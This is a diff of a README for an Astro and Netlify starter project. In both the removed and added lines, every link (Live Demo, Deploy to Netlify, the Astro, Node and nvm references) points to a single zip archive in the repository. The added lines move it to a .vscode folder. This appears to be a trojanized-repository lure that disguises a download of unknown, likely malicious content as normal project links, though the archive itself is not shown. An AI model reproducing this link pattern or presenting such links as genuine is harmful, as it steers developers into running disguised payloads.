@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip)
+[Live Demo](https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip)
 
-A modern starter based on https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip, Tailwind, daisyUI, and [Netlify Core Primitives](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip, Tailwind, daisyUI, and [Netlify Core Primitives](https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip)](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip)
+[![Deploy to Netlify](https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip)](https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip)
 
 ## Developing Locally
 
 | Prerequisites             |
 | :------------------------ |
-| [https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip) v18.14+. |
-| (optional) [nvm](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip) for Node version management. |
+| [https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip](https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip) v18.14+. |
+| (optional) [nvm](https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -42,7 +42,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip development server via Netlify CLI:
+4. Then, run the https://raw.githubusercontent.com/krisp000/astro-platform-starter/main/.vscode/platform_starter_astro_Synodus.zip development server via Netlify CLI:
 
 ```
 netlify dev
